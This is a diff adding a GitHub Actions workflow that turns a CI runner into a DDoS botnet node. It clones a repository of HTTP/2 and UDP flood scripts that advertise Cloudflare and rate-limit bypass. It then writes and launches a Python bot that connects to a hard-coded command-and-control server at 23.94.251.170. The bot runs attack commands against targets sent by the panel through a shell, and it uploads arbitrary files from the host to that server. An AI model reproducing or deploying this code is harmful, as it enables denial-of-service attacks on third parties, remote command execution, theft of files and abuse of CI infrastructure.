@@ -1,0 +1,378 @@
+name: SEVER AI STV PREMIUM
+
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: 'Thoi gian chay Tool'
+        required: false
+        default: '5h40m'
+        type: choice
+        options:
+          - '1h'
+          - '3h'
+          - '5h40m'
+
+jobs:
+  Auto-Run-Bot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    
+    steps:
+      - name: Setup environment
+        run: |
+          echo "Setup environment"
+          sudo apt-get update -y
+          sudo apt-get install -y python3 python3-pip git curl wget screen
+          
+          curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+          sudo apt-get install -y nodejs
+          
+          pip3 install "python-socketio[client]" requests 2>/dev/null || pip3 install "python-socketio[client]" requests
+
+      - name: Download source and create bot
+        run: |
+          echo "Download source"
+          
+          mkdir -p /tmp/bb
+          cd /tmp/bb
+          
+          git clone https://github.com/Jillianhobaica361/Bb
+          cd Bb
+          
+          # ===== CÀI MODULES NODE.JS =====
+          echo "Installing Node.js dependencies..."
+          
+          if [ ! -f package.json ]; then
+            echo '{"name":"Bb","version":"1.0.0","dependencies":{}}' > package.json
+          fi
+          
+          npm install \
+            puppeteer-real-browser \
+            fingerprint-generator \
+            fingerprint-injector \
+            colors \
+            cluster \
+            child_process \
+            fs \
+            net \
+            tls \
+            hpack \
+            http2 \
+            url \
+            crypto \
+            user-agents \
+            header-generator \
+            fake-useragent \
+            http2-wrapper \
+            axios \
+            https \
+            socks \
+            chalk@4 \
+            node-fetch \
+            util \
+            dns \
+            --save
+          
+          echo "Checking installed modules..."
+          npm list --depth=0
+          
+          # ===== CHMOD +X =====
+          echo "Setting execute permissions..."
+          chmod +x raw 2>/dev/null || echo "raw not found"
+          chmod +x firefox 2>/dev/null || echo "firefox not found"
+          chmod +x h2-bypass.js 2>/dev/null || echo "BYPASS.js not found"
+          chmod +x bypassv1.js 2>/dev/null || echo "BYPASSV1.js not found"
+          chmod +x h2-browser.js 2>/dev/null || echo "BROWSER.js not found"
+          chmod +x h2-flood.js 2>/dev/null || echo "H2-FLOOD.js not found"
+          chmod +x h2-zentra.js 2>/dev/null || echo "H2-PID.js not found"
+          chmod +x flooder.js 2>/dev/null || echo "H2-RAW.js not found"
+          chmod +x h2-tls.js 2>/dev/null || echo "H2-ZENTRA.js not found"
+          chmod +x udp.py 2>/dev/null || echo "udp.py not found"
+          chmod +x setup.sh 2>/dev/null || echo "setup.sh not found"
+          
+          echo "Creating bot.py"
+          
+          # ===== TẠO BOT.PY BẰNG HEREDOC =====
+          cat > bot.py << 'EOF'
+          #!/usr/bin/env python3
+          import socketio
+          import subprocess
+          import os
+          import requests
+          import time
+          import sys
+          import json
+          import threading
+          import platform
+          import signal
+
+          C2_SERVER_URL = 'http://23.94.251.170:3000'
+
+          print(f'[BOT] Starting... Panel: {C2_SERVER_URL}')
+          print(f'[BOT] Hostname: {platform.node()}')
+
+          sio = socketio.Client()
+
+          METHODS = {	
+              'h2-bypass': {
+                  'label': 'HTTP/S H2-BYPASS (TLS + JA3 Spoof + Proxy)',
+                  'cmd': 'node h2-bypass.js GET {url} {time} 2 2 live.txt --full --ratelimit true'
+              },
+              'h2-kill': {
+                  'label': 'HTTP/S H2-KILL (Full JA3 Spoof + Cache Bypass)',
+                  'cmd': 'node bypassv1.js GET {url} {time} 2 2 live.txt --adaptive --jitter --stealth --slow-start --rotate-ua --respect-rate'
+              },
+              'h2-browser': {
+                  'label': 'HTTP/S H2-BROWSWER (CF Bypass + Fingerprint)',
+                  'cmd': 'node h2-browser.js {url} {time} 2 2 live.txt --flooder true --threads 1'
+              },
+              'h2-flood': {
+                  'label': 'HTTP/S H2-FLOOD (TLS Spoof + Random Headers)',
+                  'cmd': 'node h2-flood.js {url} {time} 8 4 live.txt'
+              },
+              'h2-zentra': {
+                  'label': 'HTTP/S H2-ZENTRA (TLS JA3 Spoof + RateLimit Bypass)',
+                  'cmd': 'node h2-zentra.js GET {url} {time} 2 2 live.txt --full --ratelimit-bypass'
+              },
+              'h2-raw': {
+                  'label': 'HTTP/S H2-RAW (Dstat)',
+                  'cmd': 'python udp.py {url} 80 1024 {time}'
+              },
+              'h2-tls': {
+                  'label': 'HTTP/S H2-TLS (TLS Spoof + Random Headers)',
+                  'cmd': 'node h2-flood.js {url} {time} 8 3 live.txt'
+              }
+          }
+
+          BASE_DIR = os.getcwd()
+
+          # Biến toàn cục lưu tiến trình và attack_id hiện tại
+          current_process = None
+          current_attack_id = None
+          process_lock = threading.Lock()
+
+          @sio.event
+          def connect():
+              print(f'[BOT] Connected to panel: {sio.sid}')
+              print('[BOT] Sending methods list to panel...')
+              sio.emit('methodsList', METHODS)
+              sio.emit('botResponse', f'Bot {platform.node()} connected! Methods: {len(METHODS)}')
+
+          @sio.event
+          def disconnect():
+              print('[BOT] Disconnected from panel')
+
+          @sio.event
+          def getMethods(data):
+              print('[BOT] Panel requested methods, sending...')
+              sio.emit('methodsList', METHODS)
+
+          @sio.event
+          def stopCommand(data):
+              global current_process, current_attack_id
+              attack_id = data.get('attackId')
+              target = data.get('target', '')
+              method = data.get('method', '')
+              print(f'[BOT] ⛔ Received stop command for attack {attack_id} on {target} ({method})')
+
+              with process_lock:
+                  if current_attack_id is None or current_attack_id != attack_id:
+                      msg = f'[BOT] Attack {attack_id} is not currently running (current: {current_attack_id})'
+                      sio.emit('botResponse', msg)
+                      print(msg)
+                      return
+
+                  if current_process is None:
+                      msg = f'[BOT] No active process for attack {attack_id}'
+                      sio.emit('botResponse', msg)
+                      print(msg)
+                      return
+
+                  try:
+                      pgid = os.getpgid(current_process.pid)
+                      print(f'[BOT] Killing process group {pgid} (PID {current_process.pid})')
+                      os.killpg(pgid, signal.SIGTERM)
+                      time.sleep(0.5)
+                      try:
+                          os.killpg(pgid, signal.SIGKILL)
+                      except OSError as e:
+                          if e.errno == 3:
+                              print('[BOT] Process already terminated')
+                          else:
+                              raise
+                      current_process = None
+                      current_attack_id = None
+                      sio.emit('botResponse', f'[BOT] ✅ Stopped attack {attack_id} on {target}')
+                      print(f'[BOT] ✅ Attack {attack_id} stopped successfully')
+                  except Exception as e:
+                      error_msg = f'[BOT] ❌ Error stopping attack: {str(e)}'
+                      sio.emit('botResponse', error_msg)
+                      print(error_msg)
+                      current_process = None
+                      current_attack_id = None
+
+          @sio.event
+          def executeCommand(data):
+              global current_process, current_attack_id
+              command = data.get('command', '')
+              attack_id = data.get('attackId', 0)
+              target = data.get('target', 'unknown')
+              method = data.get('method', 'unknown')
+              duration = data.get('duration', 60)
+
+              print(f'[BOT] Received command: {command[:100]}...')
+
+              if command.startswith('__DOWNLOAD__ '):
+                  file_path = command.replace('__DOWNLOAD__ ', '').strip()
+                  sio.emit('botResponse', f'[*] Pulling file {os.path.basename(file_path)}...')
+                  if os.path.exists(file_path):
+                      try:
+                          with open(file_path, 'rb') as f:
+                              files = {'file': f}
+                              r = requests.post(f'{C2_SERVER_URL}/bot-upload', files=files, timeout=30)
+                              if r.status_code == 200:
+                                  sio.emit('botResponse', f'[+] Success! Download: {C2_SERVER_URL}/admin-download/{os.path.basename(file_path)}')
+                              else:
+                                  sio.emit('botResponse', f'[!] Upload failed. Status: {r.status_code}')
+                      except Exception as e:
+                          sio.emit('botResponse', f'[!] Upload error: {str(e)}')
+                  else:
+                      sio.emit('botResponse', '[!] File not found on Bot.')
+                  return
+
+              cmd = command.replace('{url}', target).replace('{time}', str(duration))
+
+              print(f'[BOT] Executing: {cmd}')
+
+              def run_command():
+                  global current_process, current_attack_id
+                  try:
+                      process = subprocess.Popen(
+                          cmd,
+                          shell=True,
+                          stdout=subprocess.PIPE,
+                          stderr=subprocess.STDOUT,
+                          text=True,
+                          cwd=BASE_DIR,
+                          bufsize=1,
+                          preexec_fn=os.setsid
+                      )
+                      with process_lock:
+                          current_process = process
+                          current_attack_id = attack_id
+                      print(f'[BOT] Started process PID {process.pid}, PGID {os.getpgid(process.pid)} for attack {attack_id}')
+
+                      for line in process.stdout:
+                          if line.strip():
+                              sio.emit('botResponse', line.strip())
+                              print(f'[OUTPUT] {line.strip()}')
+
+                      return_code = process.wait()
+                      with process_lock:
+                          if current_process == process:
+                              current_process = None
+                              current_attack_id = None
+                      print(f'[BOT] Process {process.pid} finished with code {return_code}')
+
+                      if return_code == 0:
+                          sio.emit('botResponse', f'[BOT] Attack completed {target}')
+                      else:
+                          sio.emit('botResponse', f'[BOT] Command failed with code {return_code}')
+                  except Exception as e:
+                      error_msg = f'[BOT] Error in command: {str(e)}'
+                      sio.emit('botResponse', error_msg)
+                      print(error_msg)
+                      with process_lock:
+                          if current_process == process:
+                              current_process = None
+                              current_attack_id = None
+
+              thread = threading.Thread(target=run_command)
+              thread.daemon = True
+              thread.start()
+
+          @sio.event
+          def ping(data):
+              sio.emit('pong', {'time': data.get('time', 0)})
+
+          @sio.event
+          def forceDisconnect(data):
+              print('[BOT] Received force disconnect, exiting...')
+              sio.disconnect()
+              sys.exit(0)
+
+          if __name__ == '__main__':
+              try:
+                  print(f'[BOT] Connecting to {C2_SERVER_URL}?type=bot...')
+                  sio.connect(f'{C2_SERVER_URL}?type=bot')
+                  print('[BOT] Connected, waiting for commands...')
+                  sio.wait()
+              except KeyboardInterrupt:
+                  print('\n[BOT] Shutting down...')
+                  sys.exit(0)
+              except Exception as e:
+                  print(f'[BOT] Connection error: {e}')
+                  sys.exit(1)
+          EOF
+          
+          echo "Bot.py created"
+
+      - name: Start bot
+        run: |
+          cd /tmp/bb/Bb
+          
+          echo "Starting bot.py"
+          
+          echo "Installed Node.js modules:"
+          npm list --depth=0
+          
+          nohup python3 bot.py > bot.log 2>&1 &
+          echo $! > /tmp/pid.txt
+          
+          sleep 5
+          
+          if pgrep -f "python3 bot.py" > /dev/null; then
+            echo "Bot is running! Connecting to Panel..."
+          else
+            echo "Bot failed to start. Check log:"
+            cat bot.log
+          fi
+
+      - name: Keep alive
+        run: |
+          cd /tmp/bb/Bb
+          
+          DURATION="${{ github.event.inputs.duration }}"
+          if [ "$DURATION" = "1h" ]; then TOTAL_MIN=60;
+          elif [ "$DURATION" = "3h" ]; then TOTAL_MIN=180;
+          else TOTAL_MIN=340; fi
+          
+          TOTAL_SEC=$((TOTAL_MIN * 60))
+          echo "Bot will run for $TOTAL_MIN minutes"
+          
+          tail -f bot.log &
+          
+          while [ $TOTAL_SEC -gt 0 ]; do
+            H=$((TOTAL_SEC / 3600))
+            M=$(( (TOTAL_SEC % 3600) / 60 ))
+            S=$((TOTAL_SEC % 60))
+            printf "\rTime left: %dh %dm %ds | Bot running..." $H $M $S
+            sleep 10
+            TOTAL_SEC=$((TOTAL_SEC - 10))
+          done
+
+      - name: Cleanup
+        if: always()
+        run: |
+          echo "Cleaning up"
+          
+          if [ -f /tmp/pid.txt ]; then
+            PID=$(cat /tmp/pid.txt)
+            kill $PID 2>/dev/null || true
+            rm -f /tmp/pid.txt
+          fi
+          
+          rm -rf /tmp/bb
+          
+          echo "Instance completed!"
